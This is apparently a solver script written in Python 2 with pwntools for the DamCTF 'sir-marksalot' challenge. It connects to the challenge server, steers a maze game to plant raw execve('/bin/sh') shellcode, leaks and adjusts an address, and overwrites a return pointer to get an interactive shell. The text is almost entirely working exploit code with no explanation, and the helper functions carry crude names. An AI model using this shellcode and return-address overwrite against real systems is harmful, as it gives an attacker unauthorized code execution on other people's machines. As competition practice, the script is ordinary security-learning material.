from pwn import *

#p = process("./sir-marksalot")
p = remote('chals.damctf.xyz', 31313)
#p.recv(1000)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.sendlineafter("do?\n","jump up and down")
p.sendline("m")
#p.interactive()
print "map:",p.recvrepeat(0.3)

print "TEST"
x = int(raw_input("x: "))
y = int(raw_input("y: "))
#pid =gdb.attach(p,gdbscript="b * play_maze+863")

def fuck():
    global p     
    p.sendline("x")
    p.sendline(sc+"ooo")

def move_left():
    global p
#    print 'left'
    p.sendline("a")



def move_down():
    global p
 #   print 'down'
    p.sendline("s")



def move_right():
    global p
    #print 'right'
    p.sendline("d")

def move_up():
    #print 'up'
    global p
    p.sendline("w")

def move_to_0_0():
    global x
    global y

    for _ in range(x):
        fuck()
        move_left()
    for _ in range(y):
        fuck()
        move_up()
    x = 0
    y = 0

def move(hor, ver):
    move_to_0_0()
    for _ in range(hor):
        fuck()
        move_right()
    for _ in range(ver):
        fuck()
        move_down()
    x = hor
    y = ver
#def do_leak():
    



def find_gru():
    for _ in range(20):
        for i in range(40):
            fuck()
            move_right()
        fuck()
        move_down()
        for k in range(40):
            fuck()
            move_left()
        fuck()
        move_down()

#move_to_0_0()i
move(11,40)
p.recvrepeat(2)
p.sendline("")
print p.recvuntil("written: ")
lol = u64(p.recvline()[:-1].ljust(8,"\0"))
lol = lol -0xb068

p.sendline("x")
p.sendline(sc+"ooooo")
move_up()

for _ in range(9):
    fuck()
    move_left()

fuck()
move_down()
#ret
p.sendline("x")
p.sendline("AAAAAAAA"+p64(lol)+"o"*16)
move_up()
#move_up()
#fuck()
x = 2
y = 39
p.recvrepeat(1)
print "lol:", hex(lol)
move_to_0_0()
find_gru()
p.recvrepeat(1)


p.interactive()
